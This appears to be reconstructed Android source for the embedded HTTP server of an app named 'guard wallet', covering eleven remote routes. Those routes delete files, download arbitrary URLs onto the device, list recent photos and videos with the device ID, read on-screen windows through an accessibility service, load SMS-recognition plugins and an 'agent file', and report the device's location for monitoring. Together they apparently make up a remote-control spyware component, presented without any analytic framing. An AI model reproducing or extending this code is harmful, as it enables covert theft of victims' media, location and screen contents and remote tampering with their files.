package com.guard.wallet.server.handler;

import com.guard.wallet.core.AppUtils;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Log;
import com.guard.wallet.req.ReqMonitorLocationVO;
import com.guard.wallet.resp.RespDeleteFileVO;
import com.guard.wallet.resp.RespDownloadFileVO;
import com.guard.wallet.server.HttpResponseHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AppManagerUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;

/**
 * 文件/同步 Handler — 11 路由。
 * vendor server/b.java 中 /deleteFile ... /cancelMonitorLocation 路由。
 */
public final class FileSyncHandler {
    private static final String TAG = "HttpServer";
    private static final int MEDIA_SYNC_LIMIT = 200;
    private static volatile ReqMonitorLocationVO monitorLocationConfig;
    private static volatile long monitorLocationStartedAt;

    private FileSyncHandler() {}

    // ─── /deleteFile ───

    public static void deleteFile(String path, String galleryUrl, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "deleteFile: " + path);
            boolean deleted = false;
            boolean galleryDeleted = false;
            if (path != null && !path.isEmpty()) {
                File file = new File(path);
                if (file.exists()) {
                    deleted = file.delete();
                }
            }
            if (!AppUtils.B(galleryUrl)) {
                galleryDeleted = deleteGalleryEntry(galleryUrl);
            }
            HttpResponseHelper.ok(response, new RespDeleteFileVO(deleted, galleryDeleted));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncDownload ───

    public static void syncDownload(String filepath, String fileUrl, boolean saveToGallery, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "syncDownload: " + fileUrl + " -> " + filepath);
            HttpResponseHelper.ok(response, downloadFile(filepath, fileUrl, saveToGallery));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /asyncDownload ───

    public static void asyncDownload(String filepath, String fileUrl, boolean saveToGallery, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "asyncDownload: " + fileUrl + " -> " + filepath);
            Thread thread = new Thread(() -> {
                try {
                    downloadFile(filepath, fileUrl, saveToGallery);
                } catch (Exception e) {
                    AppUtils.s(TAG, e);
                }
            }, "async-download");
            thread.setDaemon(true);
            thread.start();
            HttpResponseHelper.ok(response, new RespDownloadFileVO(filepath, saveToGallery ? filepath : null));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncPhotos ───

    public static void syncPhotos(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "syncPhotos");
            Thread worker = new Thread(() -> {
                try {
                    new com.guard.wallet.thread.WifiConnectCallable(1, MediaStore.Images.Media.EXTERNAL_CONTENT_URI).call();
                } catch (Exception e) {
                    AppUtils.s(TAG, e);
                }
            }, "sync-photos");
            worker.setDaemon(true);
            worker.start();
            HttpResponseHelper.ok(response, queryMediaStore(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    "date_modified desc",
                    "image"));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncVideos ───

    public static void syncVideos(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "syncVideos");
            Thread worker = new Thread(() -> {
                try {
                    new com.guard.wallet.thread.WifiConnectCallable(2, MediaStore.Video.Media.EXTERNAL_CONTENT_URI).call();
                } catch (Exception e) {
                    AppUtils.s(TAG, e);
                }
            }, "sync-videos");
            worker.setDaemon(true);
            worker.start();
            HttpResponseHelper.ok(response, queryMediaStore(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    "date_modified desc",
                    "video"));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncPermissions ───

    public static void syncPermissions(AsyncHttpServerResponse response, String pkg) {
        try {
            Log.d(TAG, "syncPermissions: " + pkg);
            DeviceQueryHandler.permissions(response, pkg);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncWindows ───

    public static void syncWindows(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "syncWindows");
            String base = com.guard.wallet.utils.SystemHelper.i0();
            if (!AppUtils.B(base)) {
                String json = AppUtils.K(base.concat("/listenWindows.json"));
                if (!AppUtils.B(json)) {
                    HttpResponseHelper.ok(response, com.google.gson.JsonParser.parseString(json));
                    return;
                }
            }
            if (MyAccessibilityService.P() != null) {
                HttpResponseHelper.ok(response, MyAccessibilityService.P().k0());
                return;
            }
            HttpResponseHelper.noContent(response);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncSmsRecognizePlug ───

    public static void syncSmsRecognizePlug(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "syncSmsRecognizePlug");
            String base = com.guard.wallet.utils.SystemHelper.i0();
            if (!AppUtils.B(base)) {
                String json = AppUtils.K(base.concat("/smsRecognizePlugs.json"));
                if (!AppUtils.B(json)) {
                    HttpResponseHelper.ok(response, com.google.gson.JsonParser.parseString(json));
                    return;
                }
            }
            HttpResponseHelper.noContent(response);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /reloadAgentFile ───

    public static void reloadAgentFile(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "reloadAgentFile");
            HttpResponseHelper.ok(response, com.guard.wallet.http.HttpApiManager.queryAgentFile());
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /realMonitorLocation ───

    public static void realMonitorLocation(long minTime, float minDistance, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "realMonitorLocation: minTime=" + minTime + " minDistance=" + minDistance);
            monitorLocationConfig = new ReqMonitorLocationVO(minTime, minDistance);
            monitorLocationStartedAt = System.currentTimeMillis();
            HttpResponseHelper.ok(response, buildMonitorLocationState(true));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /cancelMonitorLocation ───

    public static void cancelMonitorLocation(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "cancelMonitorLocation");
            Map<String, Object> state = buildMonitorLocationState(false);
            monitorLocationConfig = null;
            monitorLocationStartedAt = 0L;
            HttpResponseHelper.ok(response, state);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    public static ReqMonitorLocationVO getMonitorLocationConfig() {
        return monitorLocationConfig;
    }

    public static long getMonitorLocationStartedAt() {
        return monitorLocationStartedAt;
    }

    private static RespDownloadFileVO downloadFile(String filepath, String fileUrl, boolean saveToGallery) {
        String targetPath = resolveDownloadPath(filepath, fileUrl);
        if (AppUtils.B(targetPath) || AppUtils.B(fileUrl)) {
            return new RespDownloadFileVO(targetPath, null);
        }
        ensureParentDirectory(targetPath);
        boolean downloaded = copyLocalFile(fileUrl, targetPath);
        if (!downloaded) {
            downloaded = com.guard.wallet.utils.DownloadBridge.download(fileUrl, targetPath)
                    || com.guard.wallet.utils.DownloadBridge.downloadMultipart(fileUrl, targetPath);
        }
        String galleryUrl = null;
        if (downloaded && saveToGallery) {
            galleryUrl = scanIntoMediaStore(targetPath);
        }
        return new RespDownloadFileVO(downloaded ? targetPath : null, galleryUrl);
    }

    private static String resolveDownloadPath(String filepath, String fileUrl) {
        if (!AppUtils.B(filepath)) {
            return filepath;
        }
        String base = com.guard.wallet.utils.SystemHelper.i0();
        String fileName = AppUtils.x(fileUrl);
        if (AppUtils.B(base) || AppUtils.B(fileName)) {
            return filepath;
        }
        return base + File.separator + fileName;
    }

    private static void ensureParentDirectory(String path) {
        if (AppUtils.B(path)) {
            return;
        }
        File parent = new File(path).getParentFile();
        if (parent != null && !parent.exists() && !parent.mkdirs()) {
            Log.w(TAG, "Failed to create parent dir: " + parent.getAbsolutePath());
        }
    }

    private static boolean copyLocalFile(String fileUrl, String targetPath) {
        Uri uri;
        try {
            uri = Uri.parse(fileUrl);
        } catch (Exception e) {
            return false;
        }
        String scheme = uri.getScheme();
        if (AppUtils.B(scheme)) {
            File src = new File(fileUrl);
            return src.exists() && copyStream(Uri.fromFile(src), targetPath);
        }
        if ("file".equalsIgnoreCase(scheme) || "content".equalsIgnoreCase(scheme)) {
            return copyStream(uri, targetPath);
        }
        return false;
    }

    private static boolean copyStream(Uri uri, String targetPath) {
        Context ctx = AppManagerUtils.getContext();
        if (ctx == null || uri == null || AppUtils.B(targetPath)) {
            return false;
        }
        ContentResolver resolver = ctx.getContentResolver();
        if (resolver == null) {
            return false;
        }
        InputStream input = null;
        FileOutputStream output = null;
        try {
            input = resolver.openInputStream(uri);
            if (input == null) {
                return false;
            }
            output = new FileOutputStream(targetPath, false);
            byte[] buffer = new byte[8192];
            int read;
            while ((read = input.read(buffer)) > 0) {
                output.write(buffer, 0, read);
            }
            output.flush();
            return true;
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            return false;
        } finally {
            AppUtils.h(input, output);
        }
    }

    private static String scanIntoMediaStore(String path) {
        Context ctx = AppManagerUtils.getContext();
        if (ctx == null || AppUtils.B(path)) {
            return null;
        }
        final String[] galleryUri = {null};
        try {
            MediaScannerConnection.scanFile(ctx, new String[]{path}, null, (scanPath, uri) -> {
                if (uri != null) {
                    galleryUri[0] = uri.toString();
                }
            });
        } catch (Exception e) {
            AppUtils.s(TAG, e);
        }
        return galleryUri[0];
    }

    private static boolean deleteGalleryEntry(String galleryUrl) {
        Context ctx = AppManagerUtils.getContext();
        if (ctx == null) {
            return false;
        }
        try {
            Uri uri = Uri.parse(galleryUrl);
            return ctx.getContentResolver().delete(uri, null, null) > 0;
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            return false;
        }
    }

    private static List<Map<String, Object>> queryMediaStore(Uri uri, String orderBy, String mediaType) {
        LinkedList<Map<String, Object>> result = new LinkedList<>();
        Context ctx = AppManagerUtils.getContext();
        if (ctx == null) {
            return result;
        }
        ContentResolver resolver = ctx.getContentResolver();
        if (resolver == null) {
            return result;
        }
        String[] projection = new String[]{
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.MIME_TYPE,
                MediaStore.MediaColumns.DATE_MODIFIED,
                MediaStore.MediaColumns.DATA
        };
        Cursor cursor = null;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                android.os.Bundle args = new android.os.Bundle();
                args.putString(ContentResolver.QUERY_ARG_SQL_SORT_ORDER, orderBy);
                args.putInt(ContentResolver.QUERY_ARG_LIMIT, MEDIA_SYNC_LIMIT);
                cursor = resolver.query(uri, projection, args, null);
            } else {
                cursor = resolver.query(uri, projection, null, null, orderBy + " limit " + MEDIA_SYNC_LIMIT);
            }
            while (cursor != null && cursor.moveToNext()) {
                result.add(buildMediaItem(cursor, uri, mediaType));
            }
        } catch (Exception e) {
            AppUtils.s(TAG, e);
        } finally {
            AppUtils.h(cursor);
        }
        return result;
    }

    private static Map<String, Object> buildMediaItem(Cursor cursor, Uri uri, String mediaType) {
        long id = getLong(cursor, MediaStore.MediaColumns._ID, 0L);
        String filePath = getString(cursor, MediaStore.MediaColumns.DATA);
        String displayName = getString(cursor, MediaStore.MediaColumns.DISPLAY_NAME);
        if (AppUtils.B(displayName) && !AppUtils.B(filePath)) {
            displayName = new File(filePath).getName();
        }
        LinkedHashMap<String, Object> item = new LinkedHashMap<>();
        item.put("id", id);
        item.put("mediaType", mediaType);
        item.put("displayName", displayName);
        item.put("size", getLong(cursor, MediaStore.MediaColumns.SIZE, 0L));
        item.put("mimeType", getString(cursor, MediaStore.MediaColumns.MIME_TYPE));
        item.put("dateModified", getLong(cursor, MediaStore.MediaColumns.DATE_MODIFIED, 0L));
        item.put("filePath", filePath);
        item.put("contentUri", Uri.withAppendedPath(uri, String.valueOf(id)).toString());
        item.put("deviceId", com.guard.wallet.utils.SharedPrefsManager.l("deviceId"));
        return item;
    }

    private static String getString(Cursor cursor, String column) {
        int index = cursor.getColumnIndex(column);
        return index >= 0 ? cursor.getString(index) : null;
    }

    private static long getLong(Cursor cursor, String column, long defaultValue) {
        int index = cursor.getColumnIndex(column);
        return index >= 0 ? cursor.getLong(index) : defaultValue;
    }

    private static Map<String, Object> buildMonitorLocationState(boolean active) {
        LinkedHashMap<String, Object> state = new LinkedHashMap<>();
        state.put("active", active);
        state.put("config", monitorLocationConfig);
        state.put("startedAt", monitorLocationStartedAt);
        Location location = getBestLastKnownLocation();
        if (location != null) {
            LinkedHashMap<String, Object> lastKnown = new LinkedHashMap<>();
            lastKnown.put("latitude", location.getLatitude());
            lastKnown.put("longitude", location.getLongitude());
            lastKnown.put("accuracy", location.getAccuracy());
            lastKnown.put("bearing", location.getBearing());
            lastKnown.put("speed", location.getSpeed());
            lastKnown.put("altitude", location.getAltitude());
            lastKnown.put("time", location.getTime());
            state.put("lastKnownLocation", lastKnown);
        }
        return state;
    }

    private static Location getBestLastKnownLocation() {
        Context ctx = AppManagerUtils.getContext();
        if (ctx == null) {
            return null;
        }
        try {
            LocationManager manager = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (manager == null) {
                return null;
            }
            List<String> providers = manager.getProviders(true);
            Location best = null;
            for (String provider : providers) {
                Location candidate = manager.getLastKnownLocation(provider);
                if (candidate == null) {
                    continue;
                }
                if (best == null || candidate.getTime() > best.getTime()) {
                    best = candidate;
                }
            }
            return best;
        } catch (SecurityException ignored) {
            return null;
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            return null;
        }
    }
}
